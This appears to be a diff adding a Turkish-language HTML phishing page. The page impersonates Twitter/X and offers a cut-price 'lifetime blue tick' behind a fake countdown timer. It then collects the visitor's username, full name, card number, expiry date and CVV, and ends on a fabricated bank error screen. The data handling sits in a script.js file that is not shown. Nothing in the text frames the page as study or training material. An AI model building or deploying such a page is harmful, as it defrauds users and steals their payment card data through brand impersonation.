@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter / X - Mavi Tik Doğrulama</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="step1">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" width="40" height="40">
+                    <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                </svg>
+            </div>
+            <div class="badge-container">
+                <div class="badge-icon">
+                    <svg viewBox="0 0 22 22" width="60" height="60">
+                        <path fill="#1d9bf0" d="M8 1.5a1 1 0 0 1 1.73-.65l2.12 2.12a1 1 0 0 0 .7.3h3a1 1 0 0 1 1 1v3a1 1 0 0 0 .3.7l2.12 2.12a1 1 0 0 1 0 1.42l-2.12 2.12a1 1 0 0 0-.3.7v3a1 1 0 0 1-1 1h-3a1 1 0 0 0-.7.3l-2.12 2.12a1 1 0 0 1-1.42 0l-2.12-2.12a1 1 0 0 0-.7-.3h-3a1 1 0 0 1-1-1v-3a1 1 0 0 0-.3-.7L1.58 11.5a1 1 0 0 1 0-1.42l2.12-2.12a1 1 0 0 0 .3-.7v-3a1 1 0 0 1 1-1h3a1 1 0 0 0 .7-.3L8 1.5z"/>
+                    </svg>
+                </div>
+                <h1>Mavi Tik Doğrulaması</h1>
+                <p class="subtitle">Sınırlı Süreli Fırsat!</p>
+            </div>
+            <div class="offer-box">
+                <div class="price-tag">
+                    <span class="old-price">₺249</span>
+                    <span class="new-price">₺5</span>
+                </div>
+                <p class="offer-text">Ömür Boyu Mavi Tik</p>
+                <div class="countdown">
+                    <span>Bu fırsat bitiyor:</span>
+                    <span id="timer">14:59</span>
+                </div>
+            </div>
+            <button class="btn-primary" onclick="nextStep(2)">Devam Et</button>
+            <p class="disclaimer">* Sınırlı sayıda kullanıcı için geçerlidir</p>
+        </div>
+
+        <div class="card hidden" id="step2">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" width="40" height="40">
+                    <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                </svg>
+            </div>
+            <h2>Kullanıcı Adınızı Girin</h2>
+            <p class="step-info">Mavi tik almak için X/Twitter kullanıcı adınızı girin</p>
+            <div class="input-group">
+                <label>Kullanıcı Adı</label>
+                <input type="text" id="username" placeholder="@kullaniciadi" required>
+            </div>
+            <button class="btn-primary" onclick="nextStep(3)">Devam Et</button>
+        </div>
+
+        <div class="card hidden" id="step3">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" width="40" height="40">
+                    <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                </svg>
+            </div>
+            <h2>Ödeme Bilgileri</h2>
+            <p class="step-info">₺15 doğrulama ücreti için kart bilgilerinizi girin</p>
+            <div class="input-group">
+                <label>Ad Soyad</label>
+                <input type="text" id="fullname" placeholder="Adınız ve Soyadınız" required>
+            </div>
+            <div class="input-group">
+                <label>Kart Numarası</label>
+                <input type="text" id="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            <div class="row">
+                <div class="input-group half">
+                    <label>Son Kullanma</label>
+                    <input type="text" id="expiry" placeholder="AA/YY" maxlength="5" required>
+                </div>
+                <div class="input-group half">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            <button class="btn-primary" onclick="submitForm()">Ödemeyi Tamamla</button>
+        </div>
+
+        <div class="card hidden" id="step4">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" width="40" height="40">
+                    <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                </svg>
+            </div>
+            <div class="error-icon">
+                <svg viewBox="0 0 24 24" width="60" height="60">
+                    <circle cx="12" cy="12" r="10" fill="#ff4444" opacity="0.2"/>
+                    <path fill="#ff4444" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <h2>Bir Hata Oluştu!</h2>
+            <p class="error-text">İşleminiz gerçekleştirilemedi. Lütfen daha sonra tekrar deneyin.</p>
+            <p class="error-code">Hata Kodu: ERR_BNK_5042</p>
+            <button class="btn-secondary" onclick="resetForm()">Tekrar Dene</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
